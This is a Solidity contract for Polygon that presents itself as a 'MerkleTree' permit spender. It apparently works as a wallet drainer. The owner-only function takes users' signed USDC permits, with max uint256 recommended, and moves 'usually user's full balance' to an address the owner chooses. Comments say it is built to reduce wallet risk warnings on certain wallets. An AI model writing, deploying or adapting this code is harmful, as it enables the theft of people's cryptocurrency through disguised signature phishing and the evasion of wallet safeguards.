// SPDX-License-Identifier: MIT
// Polnation MerkleTree — Permit Spender Contract (Polygon Mainnet)
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

interface IUSDC is IERC20 {
    function permit(
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;
}

/// @title  PolnationMerkleTree
/// @notice Collects USDC permit signatures and executes permit + transferFrom
///         in a single owner-only transaction. Used for non-Trust/Bitget wallets
///         where a verified contract spender reduces wallet risk warnings.
contract PolnationMerkleTree is Ownable {
    IUSDC public immutable usdc;

    string public constant name    = "PolnationMerkleTree";
    string public constant version = "1";

    event PermitExecuted(
        address indexed owner,
        address indexed recipient,
        uint256 amount,
        bytes32 indexed operationId
    );

    constructor(address _usdc) Ownable(msg.sender) {
        usdc = IUSDC(_usdc);
    }

    /// @notice Execute permit authorisation + transferFrom in one call.
    /// @param owner      User wallet that signed the permit.
    /// @param value      Permit value (max uint256 recommended).
    /// @param deadline   Permit deadline timestamp.
    /// @param v r s      Permit signature components.
    /// @param recipient  Address to receive the USDC.
    /// @param amount     Actual amount to transfer (usually user's full balance).
    /// @param operationId  Unique bytes32 for on-chain tracking.
    function executeWithPermit(
        address owner,
        uint256 value,
        uint256 deadline,
        uint8   v,
        bytes32 r,
        bytes32 s,
        address recipient,
        uint256 amount,
        bytes32 operationId
    ) external onlyOwner {
        usdc.permit(owner, address(this), value, deadline, v, r, s);
        usdc.transferFrom(owner, recipient, amount);
        emit PermitExecuted(owner, recipient, amount, operationId);
    }

    /// @notice Query how much USDC this contract is approved to spend for owner.
    function getAllowance(address owner) external view returns (uint256) {
        return usdc.allowance(owner, address(this));
    }
}
